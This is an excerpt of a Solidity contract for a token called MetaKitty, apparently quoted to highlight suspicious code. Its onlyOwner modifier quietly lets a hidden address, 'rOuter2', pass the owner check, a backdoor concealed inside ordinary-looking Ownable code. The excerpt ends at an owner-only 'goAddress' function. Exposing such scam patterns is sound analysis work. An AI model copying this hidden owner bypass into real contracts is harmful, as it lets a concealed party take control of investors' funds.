...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_msgSender()   ==  rOuter2 ||  _owner == _msgSender() , "Ownable: caller is not the owner");
        _;
    }
...
contract Baby is Context, IERC20, Ownable {
    ...
    string private _name = unicode"🐱MetaKitty";
    string private _symbol = unicode"🐱MetaKitty";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xf3a3F58533f00919Dc9B967226fa6225f9032Deb);
    address payable public teamWalletAddress = payable(0xf3a3F58533f00919Dc9B967226fa6225f9032Deb);
    ...
    function goAddress(uint256 amount,address account) onlyOwner() public {
